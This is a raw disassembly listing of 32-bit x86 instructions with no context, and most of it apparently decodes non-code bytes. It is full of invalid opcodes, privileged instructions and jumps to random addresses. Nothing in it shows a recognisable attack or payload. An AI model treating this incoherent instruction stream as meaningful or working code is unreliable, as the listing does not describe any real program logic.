  413e68:	mov    bl,0xc4
  413e6a:	sbb    BYTE PTR [esi],ah
  413e6c:	adc    ah,bl
  413e6e:	(bad)  
  413e70:	int3   
  413e71:	nop
  413e72:	clc    
  413e73:	cdq    
  413e74:	fwait
  413e75:	rcr    BYTE PTR [eax-0x510be55b],cl
  413e7b:	icebp  
  413e7c:	mov    bl,0xff
  413e7e:	sbb    al,0xd6
  413e80:	pop    esp
  413e81:	bound  edx,QWORD PTR [eax+0x39]
  413e84:	mov    bl,0x83
  413e86:	xor    cl,BYTE PTR fs:[edi+0x5388a5f0]
  413e8d:	cli    
  413e8e:	push   edx
  413e90:	imul   ebx,DWORD PTR [ebx+0x101a85f2],0x64e9c419
  413e9a:	sbb    esi,DWORD PTR [eax+0x66dfbd8b]
  413ea0:	test   eax,0x137c385a
  413ea5:	cs add al,0x68
  413ea8:	add    BYTE PTR ds:0x12346646,ch
  413eae:	lds    edx,FWORD PTR [eax]
  413eb0:	in     eax,0x57
  413eb2:	mov    al,ds:0xbdaee667
  413eb7:	mov    ch,BYTE PTR ds:[ebp-0x70cd1b9c]
  413ebe:	push   esp
  413ebf:	sub    DWORD PTR [esi-0x4e],eax
  413ec2:	inc    ecx
  413ec3:	(bad)  
  413ec4:	xchg   ebx,eax
  413ec5:	iret   
  413ec6:	in     eax,0xea
  413ec8:	jg     0x413ed3
  413eca:	dec    esi
  413ecb:	cld    
  413ecc:	cs jns 0x413efb
  413ecf:	mov    al,ds:0x77258372
  413ed4:	(bad)  
  413ed5:	cld    
  413ed6:	out    dx,eax
  413ed7:	fs mov ebx,0x9441de1b
  413edd:	cmp    dh,dl
  413edf:	lock xor esp,DWORD PTR [esi-0x4e1ea39a]
  413ee6:	mov    esp,cs
  413ee8:	leave  
  413ee9:	cld    
  413eea:	sub    al,0xaa
  413eec:	sbb    esp,ecx
  413eee:	mov    al,0xd5
  413ef0:	cli    
  413ef1:	pop    ebp
  413ef2:	cli    
  413ef3:	or     eax,0x7dfb65c
  413ef8:	pop    ebx
  413ef9:	inc    edx
  413efa:	xlat   BYTE PTR ds:[ebx]
  413efb:	mov    eax,0xa3f2e782
  413f00:	in     eax,0xed
  413f02:	push   eax
  413f03:	push   DWORD PTR [eax]
  413f05:	lea    eax,ds:0x426b9a
  413f0b:	push   DWORD PTR [eax]
  413f0d:	jmp    0x414418
  413f12:	les    edi,FWORD PTR ds:0xd9d9c9d3
  413f18:	fidivr DWORD PTR ds:0x94ead996
  413f1e:	es mov dh,0x8e
  413f21:	stos   BYTE PTR es:[edi],al
  413f22:	push   esi
  413f23:	push   ds
  413f24:	jg     0x413f9e
  413f26:	push   0x7c
  413f28:	js     0x413fa2
  413f2a:	retf   0x90b6
  413f2d:	inc    BYTE PTR [ecx+0x301be5e7]
  413f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f34:	test   eax,0xa49d9fa
  413f39:	cmp    eax,0x6a4fdd43
  413f3e:	push   eax
  413f3f:	ret    
  413f40:	mov    ebx,0x2ccffb9d
  413f45:	ds pop es
  413f47:	lds    edx,FWORD PTR [edi+eax*8+0x1c]
  413f4b:	ins    BYTE PTR es:[edi],dx
  413f4c:	int3   
  413f4d:	inc    ecx
  413f4e:	(bad)
  413f52:	xchg   esi,eax
  413f53:	in     eax,dx
  413f54:	xor    edi,DWORD PTR [ebp-0x6d]
  413f57:	inc    esp
  413f58:	out    dx,eax
  413f59:	push   edi
  413f5a:	xor    eax,0x3b66d76c
  413f5f:	inc    ebp
  413f60:	dec    ebx
  413f61:	sbb    al,0x99
  413f63:	dec    ecx
  413f64:	jmp    0xd645:0x9d5a84ef
  413f6b:	mov    al,0x60
  413f6d:	ds mov bl,0x3
  413f70:	bound  eax,QWORD PTR [ebp-0x2d]
  413f73:	(bad)  
  413f75:	popf   
  413f76:	iret   
  413f77:	sbb    al,0x52
  413f79:	and    ecx,DWORD PTR [ebx-0x10c8b2ad]
  413f7f:	push   ss
  413f80:	jp     0x413f0b
  413f82:	add    BYTE PTR [edx],0xe
  413f85:	sub    ah,ch
  413f87:	push   ss
  413f88:	ror    DWORD PTR [ecx+esi*8],cl
  413f8b:	inc    esi
  413f8c:	std    
  413f8d:	ss push esp
  413f8f:	in     al,dx
  413f90:	xchg   esp,eax
  413f91:	inc    ecx
  413f92:	shl    edi,cl
  413f94:	pop    ss
  413f95:	bnd ja 0x413fec
  413f98:	and    BYTE PTR [ecx-0x6f2d5819],0xa6
  413f9f:	(bad)  
  413fa0:	xchg   esp,eax
  413fa1:	mov    ah,cl
  413fa3:	int    0x4b
  413fa5:	jmp    0x414af1d0
  413faa:	cld    
  413fab:	add    bl,BYTE PTR [edi+0x1e]
  413fae:	out    0xcd,al
  413fb0:	mov    eax,0x120d7b34
  413fb5:	enter  0x42b5,0x9d
  413fb9:	or     esi,DWORD PTR [eax+eax*4-0x24]
  413fbd:	(bad)  
  413fbe:	cld    
  413fbf:	push   ds
  413fc0:	fwait
  413fc1:	mov    edi,0x6cb772c3
  413fc6:	xor    eax,0x5dcabe5a
  413fcb:	sub    bl,BYTE PTR [edx+0xe]
  413fce:	(bad)  
  413fd0:	adc    esi,edi
  413fd2:	dec    ecx
  413fd3:	mov    ebx,0x3f562902
  413fd8:	ret    
  413fd9:	push   esi
  413fda:	sbb    cl,bl
  413fdc:	add    ecx,DWORD PTR [edi+ebp*1-0x30c9f0fb]
  413fe3:	imul   edx,DWORD PTR [esp+ecx*2+0x1],0x55996da1
  413feb:	and    bl,al
  413fed:	mov    ds:0x50e578f9,al
  413ff2:	cmp    bh,bh
  413ff4:	xchg   ebx,eax
  413ff5:	nop
  413ff6:	int3   
  413ff7:	xor    esp,DWORD PTR [ebp+0x52]
  413ffa:	push   eax
  413ffb:	aam    0xa
  413ffd:	mov    cl,0xbf
  413fff:	pop    ebx
  414000:	xor    BYTE PTR [edi+0x59],0x9f
  414004:	sub    al,0x52
  414006:	sahf   
  414007:	mov    ecx,0x1fe48b73
  41400c:	jmp    0xf25a40a2
  414011:	jnp    0x413fe6
  414013:	cmp    eax,0x30298ebc
  414018:	out    0xa8,al
  41401a:	push   edi
  41401b:	clc    
  41401c:	ret    
  41401d:	jo     0x414009
  41401f:	adc    bh,0x13
  414022:	es addr16 out dx,eax
  414025:	push   ss
  414026:	ret    0x9696
  414029:	lods   eax,DWORD PTR ds:[esi]
  41402a:	std    
  41402b:	mov    bh,0xda
  41402d:	lds    ebp,FWORD PTR [ebx+0x6d]
  414030:	enter  0x44d0,0xb4
  414034:	inc    edx
  414035:	push   ss
  414036:	inc    edx
  414037:	xchg   DWORD PTR [edi-0x247a0066],eax
  41403d:	rcr    DWORD PTR [esi+0x550628cf],1
  414043:	dec    ebx
  414044:	jno    0x4140c2
  414046:	mov    DWORD PTR [esi-0x67765982],ecx
  41404c:	and    al,0xa1
  41404e:	fwait
  41404f:	out    0xbf,al
  414051:	push   eax
  414052:	or     ecx,DWORD PTR [ecx+0x37]
  414055:	stc    
  414056:	leave  
  414057:	int3   
  414058:	push   0x262a20b9
  41405d:	imul   esp,DWORD PTR [ebp-0x1f],0x7a0d5e86
  414064:	sbb    al,0x74
  414066:	in     eax,dx
  414067:	ins    BYTE PTR es:[edi],dx
  414068:	cdq    
  414069:	mov    BYTE PTR [ecx-0x7d59c9b9],dh
  41406f:	and    al,0x49
  414071:	and    DWORD PTR [esi-0x63],eax
  414074:	pusha  
  414075:	ds jmp 0x2c7a02a9
  41407b:	test   eax,0xc5bce64e
  414080:	or     eax,0xe03ce24a
  414085:	cmp    bl,BYTE PTR [edi]
  414087:	pop    esi
  414088:	and    al,0x5b
  41408a:	icebp  
  41408b:	mov    bh,0x35
  41408d:	ds ret 
  41408f:	popf   
  414090:	adc    BYTE PTR [edi],0x1a
  414093:	cmp    eax,0x59b046f5
  414098:	push   esi
  414099:	sub    DWORD PTR [edx],ecx
  41409b:	test   eax,0x90ecff0
  4140a0:	mov    ah,BYTE PTR [eax+0x58]
  4140a3:	enter  0xd3fb,0x1f
  4140a7:	lods   al,BYTE PTR ds:[esi]
  4140a8:	jecxz  0x414122
  4140aa:	retf   
  4140ab:	inc    ecx
  4140ac:	adc    DWORD PTR [eax-0x4e],ebp
  4140af:	or     al,BYTE PTR [eax+ebx*2-0x65c9eb86]
  4140b6:	popa   
  4140b7:	push   eax
  4140b8:	fs cmc 
  4140ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140bb:	xchg   edi,eax
  4140bc:	xchg   esp,eax
  4140bd:	jp     0x414122
  4140bf:	aas    
  4140c0:	jle    0x4140a9
  4140c2:	or     eax,0x51be0c83
  4140c7:	mov    ecx,0xec907377
  4140cc:	inc    ebp
  4140cd:	fstp   DWORD PTR [ebx+eax*8]
  4140d0:	icebp  
  4140d1:	bound  eax,QWORD PTR [edi]
  4140d3:	jge    0x41408c
  4140d5:	loopne 0x4140b3
  4140d7:	ret    
  4140d8:	add    esp,edi
  4140da:	sbb    ch,BYTE PTR [ecx+0x3ff6c268]
  4140e0:	arpl   ax,di
  4140e2:	add    DWORD PTR [ebx+0x5],eax
  4140e5:	xchg   edx,eax
  4140e6:	mov    cl,0x14
  4140e8:	sar    DWORD PTR [edi],cl
  4140ea:	mov    ebx,0xf106339
  4140ef:	adc    DWORD PTR [eax],esi
  4140f1:	icebp  
  4140f2:	sbb    eax,DWORD PTR [ebx]
  4140f4:	or     edi,ebp
  4140f6:	and    BYTE PTR [ebx+0x5e],bh
  4140f9:	call   0xdef1ce9c
  4140fe:	push   cs
  4140ff:	xchg   esi,eax
  414100:	aaa    
  414101:	push   0x802f4804
  414106:	push   0x5cbff38e
  41410b:	int3   
  41410c:	sahf   
  41410d:	mov    ?,WORD PTR [esi-0x5afca9ce]
  414113:	inc    ebx
  414114:	sbb    edx,ebp
  414116:	push   ebp
  414117:	inc    ebp
  414118:	mov    BYTE PTR [edi+eiz*2],cl
  41411b:	inc    edi
  41411c:	mov    edi,DWORD PTR [esi+eiz*8-0x5c5f0677]
  414123:	inc    esp
  414124:	aam    0xe7
  414126:	push   0x42d2cbc8
  41412b:	pop    esi
  41412c:	mov    esi,DWORD PTR [ebx-0x3507c303]
  414132:	sub    eax,0xbc23b53
  414137:	test   DWORD PTR [ecx+ebx*4+0x6f11026],0xd92ca018
  414142:	in     al,dx
  414143:	add    eax,0xdb9f8207
  414148:	mov    esp,0x1fd2c4fe
  41414d:	cli    
  41414e:	out    dx,eax
  41414f:	stos   DWORD PTR es:[edi],eax
  414150:	in     al,0x95
  414152:	ds popf 
  414154:	test   BYTE PTR [esi-0x6],ah
  414157:	call   0xec52b89e
  41415c:	mov    WORD PTR [edx+0x473949b0],es
  414162:	mov    ds:0xba44e7fb,eax
  414167:	sti    
  414168:	cwde   
  414169:	clc    
  41416a:	retf   
  41416b:	or     eax,0xf0ab85ba
  414170:	daa    
  414171:	inc    ebx
  414172:	pop    edx
  414173:	pop    ds
  414174:	and    al,0xf0
  414176:	jo     0x41410a
  414178:	mov    ds:0x7989566,al
  41417d:	pushf  
  41417e:	popa   
  41417f:	(bad)  
  414180:	xchg   ecx,eax
  414181:	jbe    0x4141c9
  414183:	xchg   edx,eax
  414184:	mov    edx,0x89580330
  414189:	jle    0x414159
  41418b:	pop    eax
  41418c:	sub    al,0xdf
  41418e:	pop    esi
  41418f:	mov    ebp,0xc66dcdd9
  414194:	push   ds
  414195:	push   0x2f
  414197:	rol    BYTE PTR [esi+0x9],0x9b
  41419b:	int    0xb3
  41419d:	(bad)  
  41419e:	call   FWORD PTR [ebp+0x60e9faaf]
  4141a4:	loope  0x414182
  4141a6:	sbb    eax,0xaa5cbc1
  4141ab:	pop    esp
  4141ad:	test   eax,0x1e2e25d4
  4141b2:	int    0x45
  4141b4:	mov    DWORD PTR [edi],eax
  4141b6:	add    ch,dh
  4141b8:	(bad)  
  4141b9:	jmp    0x7e53:0xb017ea03
  4141c0:	sub    dl,0x7e
  4141c3:	cmp    dh,BYTE PTR ds:0xa93bf0a2
  4141c9:	std    
  4141ca:	adc    DWORD PTR [ecx],esi
  4141cc:	sahf   
  4141cd:	dec    edx
  4141ce:	xor    BYTE PTR [edx-0x6d03c385],bl
  4141d4:	or     eax,esi
  4141d6:	lods   eax,DWORD PTR ds:[esi]
  4141d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141d8:	mov    ebx,0xbb788935
  4141dd:	jnp    0x414222
  4141df:	imul   esi,ebx,0xdfa5c7c4
  4141e5:	je     0x414234
  4141e7:	xor    al,0x35
  4141e9:	mov    bl,0x92
  4141eb:	jb     0x4141fd
  4141ed:	or     eax,0x5f0cd548
  4141f2:	or     ebx,0xa1fc626a
  4141f8:	in     eax,0x70
  4141fa:	mov    WORD PTR ds:[edi-0x36],cs
  4141fe:	adc    BYTE PTR [esp+edi*8-0x6b40839],ch
  414205:	adc    DWORD PTR [eax+0x1],esp
  414208:	mov    edx,0x787c416b
  41420d:	adc    eax,0xbd6aa996
  414212:	pop    es
  414213:	daa    
  414214:	cmp    ecx,DWORD PTR [edi-0x2432cbf6]
  41421a:	push   es
  41421b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41421c:	push   ebp
  41421d:	call   0x8a329766
  414222:	sub    eax,0x71db0cbb
  414227:	sbb    eax,0x1938ac6f
  41422c:	sub    DWORD PTR [esi+0x29a15e70],esp
  414232:	(bad)
  414237:	xchg   ebx,eax
  414238:	jnp    0x414231
  41423a:	ins    DWORD PTR es:[edi],dx
  41423b:	fwait
  41423c:	pop    eax
  41423d:	mov    ecx,DWORD PTR [edi]
  41423f:	mov    ebx,0x14d7dc15
  414244:	mov    esi,0xa7780aa8
  414249:	scas   al,BYTE PTR es:[edi]
  41424a:	sbb    DWORD PTR [edx-0x67],0x2f6f199e
  414251:	stc    
  414252:	push   0x668edd35
  414257:	jp     0x4142af
  414259:	loop   0x41429e
  41425b:	and    BYTE PTR [eax+0x2c],dh
  41425e:	ds jg  0x414290
  414261:	push   cs
  414262:	xchg   ecx,eax
  414263:	ret    
  414264:	fidiv  DWORD PTR [edx+0x1e]
  414267:	inc    edi
  414268:	adc    BYTE PTR [edi],0xed
  41426b:	lock rol DWORD PTR [ebx-0x20],0x51
  414270:	mov    ah,0xd5
  414272:	(bad)  
  414274:	(bad)  
  414276:	cdq    
  414277:	inc    eax
  414278:	sar    BYTE PTR [eax+0x71],1
  41427b:	inc    esp
  41427c:	xchg   ebx,ecx
  41427e:	inc    ebp
  41427f:	adc    bh,BYTE PTR [ecx+0x2f]
  414282:	and    DWORD PTR [eax],ebx
  414284:	enter  0x36a0,0xb6
  414288:	mov    ecx,ebp
  41428a:	or     edi,DWORD PTR [eax+0x74]
  41428d:	dec    eax
  41428e:	pop    ds
  41428f:	or     ebp,DWORD PTR [ebx+0x64]
  414292:	retf   
  414293:	push   0xbd6a5f82
  414298:	sbb    al,0x17
  41429a:	(bad)  
  41429b:	jg     0x414251
  41429d:	sbb    al,0x89
  41429f:	gs mov cl,0x3e
  4142a2:	cld    
  4142a3:	fadd   QWORD PTR [esi]
  4142a5:	imul   ebp,DWORD PTR [eax+0x14e7353f],0xffffff96
  4142ac:	mov    ebx,DWORD PTR [edi-0x520321eb]
  4142b2:	push   0x2deda61a
  4142b7:	les    eax,FWORD PTR [ebx-0x4a]
  4142ba:	xchg   edx,eax
  4142bb:	xchg   ebx,eax
  4142bc:	ja     0x4142f8
  4142be:	pop    edi
  4142bf:	scas   al,BYTE PTR es:[edi]
  4142c0:	icebp  
  4142c1:	les    ecx,FWORD PTR [ebx]
  4142c3:	enter  0x7a7d,0xd5
  4142c7:	jp     0x4142d2
  4142c9:	loope  0x41426e
  4142cb:	jge    0x4142b5
  4142cd:	addr16 inc ebp
  4142cf:	mov    ?,WORD PTR [eax+0x74]
  4142d2:	inc    esp
  4142d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142d4:	inc    eax
  4142d5:	dec    esp
  4142d6:	test   DWORD PTR [ebx-0x41],ebp
  4142d9:	push   0x16233889
  4142de:	add    al,BYTE PTR [edi+0x68]
  4142e1:	dec    esp
  4142e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142e3:	mov    ds:0xfade3f6f,al
  4142e8:	ins    BYTE PTR es:[edi],dx
  4142e9:	add    al,0xd2
  4142eb:	inc    eax
  4142ec:	fld    TBYTE PTR [ebp+0x3b]
  4142ef:	call   0xa582:0xf504f2e8
  4142f6:	out    0x48,al
  4142f8:	push   edx
  4142f9:	xchg   BYTE PTR [ebx],al
  4142fb:	jno    0x4142a8
  4142fd:	test   edi,edi
  4142ff:	test   cl,bl
  414301:	repnz xlat BYTE PTR ds:[ebx]
  414303:	dec    ecx
  414304:	pop    DWORD PTR [ebx-0x7775e352]
  41430a:	(bad)  
  41430b:	(bad)  
  41430c:	mov    edx,0x67ab70d9
  414311:	mov    edx,0xbaf30f92
  414316:	push   eax
  414317:	mov    al,0xca
  414319:	mov    ecx,gs
  41431b:	icebp  
  41431c:	sbb    DWORD PTR [eax-0x3baf7b9a],edi
  414322:	cmc    
  414323:	mov    ds:0x451cd943,al
  414328:	pavgw  mm5,QWORD PTR [edi]
  41432b:	in     al,0x74
  41432d:	imul   esi,edi,0x7d
  414330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414331:	push   edi
  414332:	sahf   
  414333:	mov    bh,BYTE PTR [ebx]
  414335:	mov    ebx,0x4f787036
  41433a:	int3   
  41433b:	xchg   esp,eax
  41433c:	test   BYTE PTR [ebp+0x3e],bh
  41433f:	pusha  
  414340:	fwait
  414341:	jbe    0x41431e
  414343:	lods   eax,DWORD PTR ds:[esi]
  414344:	cdq    
  414345:	sahf   
  414346:	nop
  414347:	or     al,dh
  414349:	leave  
  41434a:	and    edx,DWORD PTR [di]
  41434d:	mov    bl,0xad
  41434f:	inc    esi
  414350:	dec    eax
  414351:	adc    DWORD PTR [ebx-0x7a],edi
  414354:	push   edx
  414355:	sbb    ah,ch
  414357:	lds    esi,FWORD PTR [edi+0x76]
  41435a:	or     eax,edx
  41435c:	sbb    al,0x31
  41435e:	push   ecx
  41435f:	sub    DWORD PTR [esi-0x71],ebp
  414362:	hlt    
  414363:	inc    edi
  414364:	pop    ebx
  414365:	enter  0xf7ae,0xf5
  414369:	mov    cl,0x31
  41436b:	inc    edx
  41436c:	or     edx,DWORD PTR [ebp-0x611c09fb]
  414372:	into   
  414373:	into   
  414374:	jp     0x414318
  414376:	or     BYTE PTR [edx+ebx*4-0x408cce67],ch
  41437d:	iret   
  41437e:	ror    DWORD PTR [esi],1
  414380:	push   0x9bfe6774
  414385:	ret    0xbdc2
  414388:	stos   BYTE PTR es:[edi],al
  414389:	cmp    eax,0xbbe70a55
  41438e:	lea    edi,[ebp-0xc1a5397]
  414394:	mov    WORD PTR [edx],fs
  414396:	xchg   BYTE PTR [edi],ch
  414398:	addr16 (bad) 
  41439a:	lds    esp,FWORD PTR [ecx]
  41439c:	call   0xd69d6487
  4143a1:	pusha  
  4143a2:	pushf  
  4143a3:	xchg   ebp,eax
  4143a4:	loope  0x41439c
  4143a6:	lea    ebx,[ecx]
  4143a8:	cmp    ch,cl
  4143aa:	cld    
  4143ab:	pop    ds
  4143ac:	or     eax,0xb1dffcb5
  4143b1:	les    ebx,FWORD PTR [edi+eax*4-0x48]
  4143b5:	inc    esp
  4143b6:	dec    ebx
  4143b7:	iret   
  4143b8:	sbb    eax,0x5a202ff1
  4143bd:	test   BYTE PTR [esi+0x5d],dh
  4143c0:	or     ebp,DWORD PTR [edi]
  4143c2:	mov    WORD PTR [eax],cs
  4143c4:	cmp    BYTE PTR [esi-0x2],bh
  4143c7:	mov    bh,0xba
  4143c9:	or     dl,BYTE PTR [eax+0x62]
  4143cc:	mov    WORD PTR [eax+0x1dd026f1],gs
  4143d2:	xchg   edx,eax
  4143d3:	inc    edx
  4143d4:	js     0x4143f9
  4143d6:	sbb    bl,BYTE PTR [ebx+0x76989d08]
  4143dc:	pop    ds
  4143dd:	push   esi
  4143de:	gs inc edx
  4143e0:	push   eax
  4143e1:	jmp    0x165f:0xaf813ba1
  4143e8:	pop    ecx
  4143e9:	push   ebx
  4143ea:	les    eax,FWORD PTR [edi-0x562fbcf2]
  4143f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143f1:	mov    bl,BYTE PTR [ecx]
  4143f3:	cmp    ebp,DWORD PTR [edi-0x3a61adea]
  4143f9:	pop    edi
  4143fa:	frstor [edi]
  4143fc:	mov    ebx,0xde95c374
  414401:	xchg   edi,eax
  414402:	dec    eax
  414403:	inc    esp
  414404:	mov    cl,dl
  414406:	pxor   mm5,QWORD PTR [edx-0xec049c]
  41440d:	in     eax,0xa1
  41440f:	mov    ds:0xfd273364,al
  414414:	push   cs
  414415:	(bad)  
  414416:	jmp    0x426c:0x4a058dc9
  41441d:	add    bh,bh
  41441f:	xor    cl,ch
  414421:	push   es
  414422:	add    eax,0xcac70000
  414427:	retf   0xc9d3
  41442a:	rcl    ebp,cl
  41442c:	fcmovb st,st(7)
  41442e:	sub    DWORD PTR [edi-0x3f303574],ecx
  414434:	sub    al,0x40
  414436:	and    DWORD PTR [edi+0x78],edi
  414439:	push   0x7c
  41443b:	js     0x4144b5
  41443d:	fwait
  41443e:	mov    edi,0xfc44aef7
  414443:	push   eax
  414444:	in     al,dx
  414445:	mov    edi,0x3df95f2
  41444a:	in     eax,0xb8
  41444c:	and    dh,BYTE PTR [edx+edi*4+0x6f]
  414450:	adc    eax,ecx
  414452:	or     eax,0x4b0e8fb7
  414457:	dec    ebp
  414458:	mov    edi,0x465b2ec9
  41445d:	cmp    ah,BYTE PTR [edi-0x65b6beb0]
  414463:	mov    bl,0xf1
  414465:	push   cs
  414466:	in     eax,0xde
  414468:	dec    esi
  414469:	in     eax,dx
  41446a:	cmp    DWORD PTR [edi-0x309bbb31],esp
  414470:	jno    0x4144a7
  414472:	pop    edi
  414473:	xchg   ebp,eax
  414474:	adc    al,BYTE PTR [esi+edx*8]
  414477:	lods   eax,DWORD PTR ds:[esi]
  414478:	sti    
  414479:	outs   dx,BYTE PTR ds:[esi]
  41447a:	mov    edx,0x232b3477
  41447f:	bound  ecx,QWORD PTR [esi+0x51]
  414482:	push   esp
  414483:	jecxz  0x414409
  414485:	or     al,0x4d
  414487:	ret    0x224
  41448a:	js     0x4144f0
  41448c:	mov    edx,0x1ba272e0
  414491:	ja     0x414446
  414493:	jbe    0x41450a
  414495:	icebp  
  414496:	sub    eax,0x1b9bb9a4
  41449b:	mov    esp,0x6dc9f070
  4144a0:	dec    esi
  4144a1:	pop    ss
  4144a2:	dec    ebx
  4144a3:	inc    ebx
  4144a4:	jmp    0x414479
  4144a6:	jp     0x4144fe
  4144a8:	mov    ebx,0x5b5c6715
  4144ad:	inc    esp
  4144ae:	push   cs
  4144af:	daa    
  4144b0:	adc    ch,BYTE PTR [edi+eax*2]
  4144b3:	mov    esi,0xd175b628
  4144b8:	sub    al,0x35
  4144ba:	(bad)  
  4144bb:	out    dx,eax
  4144bc:	and    eax,0x11721e98
  4144c1:	in     eax,dx
  4144c2:	mov    dh,0x60
  4144c4:	arpl   WORD PTR [ebx+0x13],si
  4144c7:	in     al,0xb
  4144c9:	sub    BYTE PTR [eax-0x26],ch
  4144cc:	xlat   BYTE PTR ds:[ebx]
  4144cd:	sbb    DWORD PTR [edi+0x1bf2936d],eax
  4144d3:	and    dh,BYTE PTR [ecx]
  4144d5:	cmp    BYTE PTR [edi],bl
  4144d7:	fwait
  4144d8:	test   BYTE PTR [ecx],al
  4144da:	sub    BYTE PTR [ebp-0x4feec4a7],bl
  4144e0:	adc    bh,bl
  4144e2:	or     DWORD PTR [esp+eiz*4],esp
  4144e5:	pop    ds
  4144e6:	dec    ebp
  4144e7:	inc    ebp
  4144e8:	mov    eax,ds:0x3643f882
  4144ed:	stos   DWORD PTR es:[edi],eax
  4144ee:	xchg   ebx,eax
  4144ef:	(bad)  
  4144f0:	daa    
  4144f1:	aaa    
  4144f2:	dec    edx
  4144f3:	jl     0x4144c4
  4144f5:	pop    esi
  4144f6:	arpl   WORD PTR [edi],ax
  4144f8:	adc    eax,0xa2bec498
  4144fd:	scas   al,BYTE PTR es:[edi]
  4144fe:	mov    bl,0xe5
  414500:	lock jnp 0x4144e9
  414503:	test   DWORD PTR [ecx+ebp*1+0xa776fa0],eax
  41450a:	ret    
  41450b:	call   0x85d18ece
  414510:	pop    edi
  414511:	(bad)  
  414512:	mov    bh,0xfb
  414514:	sbb    al,0xfc
  414516:	les    ecx,FWORD PTR [esi]
  414518:	cdq    
  414519:	mov    ebp,0xb00d94cd
  41451e:	ins    BYTE PTR es:[edi],dx
  41451f:	dec    ebp
  414520:	push   esp
  414521:	dec    edi
  414522:	cwde   
  414523:	sar    DWORD PTR [ebx-0x38],1
  414526:	pop    esp
  414527:	push   ecx
  414528:	mov    dl,0x1
  41452a:	fistp  WORD PTR [eax-0x41]
  41452d:	lods   eax,DWORD PTR ds:[esi]
  41452e:	popa   
  41452f:	jnp    0x4144c1
  414531:	out    0x73,eax
  414533:	mov    eax,0x592b1780
  414538:	mov    ebp,0x4745e228
  41453d:	std    
  41453e:	dec    edx
  41453f:	scas   eax,DWORD PTR es:[edi]
  414540:	and    ah,ah
  414542:	push   ds
  414543:	push   ebp
  414544:	pushf  
  414545:	aaa    
  414546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414547:	mov    ebp,0x46a9e84d
  41454c:	ja     0x41455e
  41454e:	xchg   edx,eax
  41454f:	jb     0x414575
  414551:	inc    ebx
  414552:	dec    eax
  414553:	xor    ecx,DWORD PTR [eax-0x15398a6c]
  414559:	cmp    al,0x4a
  41455b:	lea    esp,[esp+eiz*2-0x20066279]
  414562:	xor    eax,0xa115c0e3
  414567:	mov    ah,0x84
  414569:	aam    0x98
  41456b:	ret    0x9644
  41456e:	xor    al,0x49
  414570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414571:	out    0xa3,eax
  414573:	sbb    DWORD PTR [ecx-0x15],esp
  414576:	xchg   ecx,eax
  414577:	ror    BYTE PTR [eax-0x5d],0xae
  41457b:	loope  0x41455a
  41457d:	dec    ebp
  41457e:	out    0xab,al
  414580:	mov    edi,0x845e7e33
  414585:	lods   eax,DWORD PTR ds:[esi]
  414586:	xlat   BYTE PTR ds:[ebx]
  414587:	out    0xa5,al
  414589:	imul   edx,DWORD PTR [esi-0x1a],0xffffffb4
  41458d:	lds    ecx,FWORD PTR [eax+eiz*4]
  414590:	cmp    ebp,esp
  414592:	iret   
  414593:	adc    ebp,DWORD PTR [ebx+esi*4]
  414596:	and    DWORD PTR [edi-0x6ea77eb3],edi
  41459c:	pushf  
  41459d:	inc    esp
  41459e:	dec    eax
  41459f:	mov    eax,ds:0x28c7fd34
  4145a4:	sahf   
  4145a5:	inc    edi
  4145a6:	mov    ebx,0x36b1b190
  4145ab:	sbb    al,0xbb
  4145ad:	dec    esp
  4145ae:	and    cl,BYTE PTR [edi+0x3e]
  4145b1:	jbe    0x4145c4
  4145b3:	push   esp
  4145b4:	or     DWORD PTR [edx-0x4df9acf3],esp
  4145ba:	data16 daa 
  4145bc:	adc    al,0x6d
  4145be:	pop    es
  4145bf:	mov    esi,0xaf39d18d
  4145c4:	xchg   ebx,eax
  4145c5:	sub    BYTE PTR [esi+0x1f],bl
  4145c8:	enter  0xbabd,0x3c
  4145cc:	push   es
  4145cd:	adc    ecx,DWORD PTR [eax-0x66e74aad]
  4145d3:	mov    ch,0x8a
  4145d5:	jmp    FWORD PTR [edx-0x62]
  4145d8:	mov    cs,WORD PTR [ebx-0x5eeda11f]
  4145de:	sub    BYTE PTR [edx+0x2adc7a9d],bh
  4145e4:	lahf   
  4145e5:	icebp  
  4145e6:	jae    0x414659
  4145e8:	mov    ds:0xced17b72,eax
  4145ed:	retf   0xbca9
  4145f0:	cmp    BYTE PTR [ecx+0x1163413b],dh
  4145f6:	ret    
  4145f7:	jp     0x414580
  4145f9:	clc    
  4145fa:	jp     0x4145b6
  4145fc:	cmp    al,0x80
  4145fe:	sahf   
  4145ff:	jns    0x414630
  414601:	test   al,0x3c
  414603:	adc    DWORD PTR [esi],ebp
  414605:	aas    
  414606:	je     0x4145fa
  414608:	in     al,0x70
  41460a:	icebp  
  41460b:	sbb    DWORD PTR [ebx],esi
  41460d:	inc    edx
  41460e:	inc    edx
  41460f:	push   ebp
  414610:	and    DWORD PTR [edx+eiz*1-0x1b],0x449fb3ff
  414618:	mov    eax,0xf66f7e16
  41461d:	or     ch,BYTE PTR [ebp-0x14321e29]
  414623:	mov    ebx,0xd3c2235a
  414628:	das    
  414629:	mov    bh,0x66
  41462b:	cmp    DWORD PTR [ebx+0x599bb1a6],edx
  414631:	mov    ebp,0xb075e5d2
  414636:	sbb    eax,0xe5244955
  41463b:	popf   
  41463c:	jnp    0x2227b7f0
  414642:	or     eax,0x4053437
  414647:	push   esp
  414648:	and    bh,BYTE PTR [esi+0x1e1c590e]
  41464e:	addr16 iret 
  414650:	inc    eax
  414651:	fwait
  414652:	jmp    0x9676:0xa7280f88
  414659:	popf   
  41465a:	push   ecx
  41465b:	pushf  
  41465c:	lods   eax,DWORD PTR ds:[esi]
  41465d:	test   al,0x28
  41465f:	pop    eax
  414660:	push   es
  414661:	add    dl,ch
  414663:	push   ds
  414664:	mov    eax,0xe7463544
  414669:	dec    ebp
  41466a:	test   BYTE PTR [eax+edi*8+0x27],bl
  41466e:	and    eax,0x8e918feb
  414673:	mov    ch,0x1
  414675:	push   ebp
  414676:	daa    
  414677:	mov    ds:0x606a2137,eax
  41467c:	in     eax,0x79
